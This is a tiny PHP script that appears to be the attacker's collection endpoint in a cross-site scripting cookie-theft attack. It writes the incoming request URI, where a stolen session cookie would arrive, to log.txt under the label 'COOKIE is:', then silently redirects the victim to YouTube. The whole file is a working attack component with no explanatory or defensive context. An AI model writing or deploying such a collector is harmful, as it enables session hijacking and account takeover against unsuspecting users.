<?php 
$f = fopen("log.txt", 'a'); 
fwrite($f, "COOKIE is: ".$_SERVER["REQUEST_URI"]."\n"); 
fclose($f); 
header("Location: http://www.youtube.com/");
?>